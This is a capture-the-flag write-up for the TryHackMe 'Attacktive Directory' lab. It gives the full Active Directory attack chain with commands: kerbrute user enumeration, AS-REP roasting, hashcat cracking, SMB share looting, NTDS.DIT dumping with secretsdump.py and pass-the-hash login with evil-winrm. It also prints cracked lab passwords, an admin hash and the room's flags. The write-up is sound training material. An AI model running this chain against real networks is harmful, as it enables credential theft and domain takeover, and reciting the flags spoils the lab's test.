# Attacktive-Directory
99% of Corporate networks run off of AD. But can you exploit a vulnerable Domain Controller?


Enumeration

Task 3 

What tool will allow us to enumerate port 139/445?
Enum4Linux [ The enumeration tool used from a Linux system is Enum4linux]


What is the NetBIOS-Domain Name of the machine?
We know from the last answer that we are using Enum4Linux to enumerate the given ip.
The actual tool can be found in the miscellaneous folder in tools.

![image](https://github.com/Rory33160/Attacktive-Directory/assets/47018034/fb724ae4-6bcd-4726-bc57-dd4c6b448533)

What is the NetBIOS-Domain Name of the machine?

THM-AD

![image](https://github.com/Rory33160/Attacktive-Directory/assets/47018034/57d46320-4eb8-4d8a-92ef-67c73fc3b6ba)

What invalid TLD do people commonly use for their Active Directory Domain?
.local 


Task 4  Enumeration Enumerating Users via Kerberos

What command within Kerbrute will allow us to enumerate valid usernames?

Userenum


What notable account is discovered? (These should jump out at you)

First we need to set up Kerbrute.
We can choose the location for download to the linux directory. [kerbrute_linux_amd64]
Wget https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_linux_amd64

![image](https://github.com/Rory33160/Attacktive-Directory/assets/47018034/c4950316-352e-4194-a0d9-12b27bef5d74)

![image](https://github.com/Rory33160/Attacktive-Directory/assets/47018034/156a45ed-65b6-49cb-ac0b-903651398cfe)

To see if the file is executable in Linux [-ls -la]
If it is not executable, then chmod +x kerbrute_linux_amd64 to change file to executable
Both the usernames and password lists are given for the challenge so we can download them to the same directory as kerbrute.
./kerbrute_linux_amd64 -h [ The help page provide the different option to use kerbrute]

![image](https://github.com/Rory33160/Attacktive-Directory/assets/47018034/20a8f687-424f-4a14-85e1-180fa0a266bc)


![image](https://github.com/Rory33160/Attacktive-Directory/assets/47018034/bd0c9ca5-ab4d-4653-b0f3-9fb622f80b6d)

Download:
Wget [Use List URL]
Wget [Password List URL]

![image](https://github.com/Rory33160/Attacktive-Directory/assets/47018034/758eca9d-e634-4d9f-96ca-098f69516ed6)

We will use the following kerbute command to enumerate the username list.
./kerbrute_linux_amd64 userenum --dc 10.10.79.124 -d spookysec.local userlist.txt

![image](https://github.com/Rory33160/Attacktive-Directory/assets/47018034/226d0ab5-1e7d-4f59-98fa-9e6e4aee662d)

We can see from the result that svc-admin@sppokysec.local stands out. Therefore, the answer is svc-admin


What is the other notable account is discovered? (These should jump out at you)
Backup
/AttactiveAD/ulist.txt

Task 5  Exploitation Abusing Kerberos
We have two user accounts that we could potentially query a ticket from. Which user account can you query a ticket from with no password?

To answer this question we will need 
GetNPUsers.py
The list of usernames provided
We’re using GetNPUsers.py -no-pass spookysec.local/svc-admin -dc-ip [ip address]

The answer is svc-admin


Looking at the Hashcat Examples Wiki page, what type of Kerberos hash did we retrieve from the KDC? (Specify the full name)
Kerberos 5, etype 23, AS-REP

![image](https://github.com/Rory33160/Attacktive-Directory/assets/47018034/95379abf-63b7-4030-ac0f-78437d3413a6)


What mode is the hash? 18200


Now crack the hash with the modified password list provided, what is the user accounts password?
We’ll need hashcat the passwordlist.txt file from the previous question and save the hash to hash.txt
Hashcat –help is useful in getting idea what flags to use and 
hashcat -a 0 -m 18200 hash.txt passwordlist.txt [ 18200 from the previous question is the mode]


![image](https://github.com/Rory33160/Attacktive-Directory/assets/47018034/2523b654-7932-43e0-b2de-d05d0b6f6eb0)

![image](https://github.com/Rory33160/Attacktive-Directory/assets/47018034/351e6f0a-91e5-4044-a410-90b4ec84e44f)

Plot twist.
To get the actual password we can use the following:
hashcat -a 0 -m 18200 hash.txt passwordlist.txt –show

![image](https://github.com/Rory33160/Attacktive-Directory/assets/47018034/9416cf9a-3dfb-4bb9-9525-e66afad83f66)

Answer is management2005
Task 6  Enumeration Back to the Basics
What utility can we use to map remote SMB shares?
smbclient -L
Which option will list shares?
Using man smbclient

![image](https://github.com/Rory33160/Attacktive-Directory/assets/47018034/129eb9bf-299d-4b08-8ff6-16d90cceb8f4)

Answer is -L

How many remote shares is the server listing?
We can use smbclient -L \\10.10.172.181\\ -U svc-admin to find the number of shares. 
We’re using the -L for the list option, the server ip and -U for the user whose creds we obtained from the hash.
Here we can see 6 shares

![image](https://github.com/Rory33160/Attacktive-Directory/assets/47018034/296ffe37-dc55-4703-bb09-4bbe59a08e9d)

There is one particular share that we have access to that contains a text file. Which share is it?
backup

What is the content of the file?
To access the share we’ll use smbclient  \\\\10.10.243.35\\backup -U svc-admin
After entering the password this will take us to the shell where we can not access the file “backup”


![image](https://github.com/Rory33160/Attacktive-Directory/assets/47018034/a9ca4f95-5950-418c-81b2-7c7e9dff1880)

Ls to see what we have:

![image](https://github.com/Rory33160/Attacktive-Directory/assets/47018034/5e472283-f271-4c1f-80a3-695d62d3f403)

The file we are interested in is backup_credentials.txt

The help menu is very useful in finding out how to download the file to your computer.

![image](https://github.com/Rory33160/Attacktive-Directory/assets/47018034/b702ca47-6520-410c-92ab-25ac65c48881)

We can test out a few of these commands, we might be familiar with most however for this task we are interested in the [get] command.
We can use it in the following way: get [filename], in this case backup_credentials.txt

![image](https://github.com/Rory33160/Attacktive-Directory/assets/47018034/12ad4cc1-9c5a-400b-a097-897efb0a8b45)

Now that the file is on our computer:


![image](https://github.com/Rory33160/Attacktive-Directory/assets/47018034/50b1a79e-03e9-43f7-9924-eb01a05b60ac)


We can view the content with cat backup_credentials.txt to find the answer to the question.

![image](https://github.com/Rory33160/Attacktive-Directory/assets/47018034/d481f765-ce33-4411-aa25-44e2e9d52fb5)

Decoding the contents of the file, what is the full contents?
We can decode in the terminal or cyberchef and decode the text.
To decode the contents of the file we can use echo [ base64 code] | base54 -d 

![image](https://github.com/Rory33160/Attacktive-Directory/assets/47018034/c30f8c06-e93f-4879-bec9-4c65adcf256d)

![image](https://github.com/Rory33160/Attacktive-Directory/assets/47018034/6c70fcd9-783b-4f9e-a808-d0bc5ca415aa)


backup@spookysec.local:backup2517860

Task 7  Domain Privilege Escalation Elevating Privileges within the Domain

For context on the next task we are escalating privileges. For context the following information will help us with the next task.

![image](https://github.com/Rory33160/Attacktive-Directory/assets/47018034/57977580-1507-464c-8642-026968dede21)

What method allowed us to dump NTDS.DIT?
We can use secretsdump.py man page to find the method.
DRSUAPI
What is the Administrators NTLM hash?
In order to get the NTLM hash from the NTDS.DIT file we will need to use secretsdump.py We understand that other tools can be used but for this task we’ll go with secretsdump.py

The goal is dump the NTLM hashes from NTDS.DIT.
Again here, the man page for Secretsdump.py can help a lot with the syntx we need to do this task.
secretsdump.py spookysec.local/backup:backup2517860@10.10.231.154 -just-dc-ntlm -outputfile hashesfile


![image](https://github.com/Rory33160/Attacktive-Directory/assets/47018034/feb456fc-80d2-43dc-b4c2-036752aad2fa)

The highlighted text is the hash for the administrator’s account.

What method of attack could allow us to authenticate as the user without the password?
pass the hash
This is a great source to read about pass the hash attacks.
[ https://www.crowdstrike.com/cybersecurity-101/pass-the-hash/ ]

Using a tool called Evil-WinRM what option will allow us to use a hash?
-H

Task 8  Flag Submission Flag Submission Panel
For this task we will be using Evil-WinRM
This tool will allow remote access to the windows machine.  Of course, the help/man page can help with the syntx for this tool.

![image](https://github.com/Rory33160/Attacktive-Directory/assets/47018034/404e5e6a-27ab-4859-bcdb-f6e995b1d858)

We need to login as administrator first to capture the flags for the other two users mentioned in this task
Essentially we are using the -H flag for the hash, lowercase -u for the user [we’re using administrator] and the ip address.
evil-winrm --ip 10.10.160.227 -u administrator -H 0e0363213e37b94221497260b0bcb4fc
We have a shell. Now we can navigate around the file system to find the flag.

![image](https://github.com/Rory33160/Attacktive-Directory/assets/47018034/239780de-4968-47f8-ba01-be75825282c8)

svc-admin
The capture the flag for svc-admin, we can navigate from within the administrator account to the user’s desktop.

![image](https://github.com/Rory33160/Attacktive-Directory/assets/47018034/99f61b4f-e0e9-4ce1-b6ef-25b1315cb428)

We also have the backup account

![image](https://github.com/Rory33160/Attacktive-Directory/assets/47018034/4bb3bd90-3554-4931-8c5f-adcdc34973b1)

TryHackMe{K3rb3r0s_Pr3_4uth}



Backup


![image](https://github.com/Rory33160/Attacktive-Directory/assets/47018034/77ae25a8-4dd3-4296-baa0-e9cb9e8986e7)

TryHackMe{B4ckM3UpSc0tty!}



Administrator
Get-Content root.txt

![image](https://github.com/Rory33160/Attacktive-Directory/assets/47018034/a890a169-7780-446d-b6d6-5d82d7d71b34)

TryHackMe{4ctiveD1rectoryM4st3r}





































































































































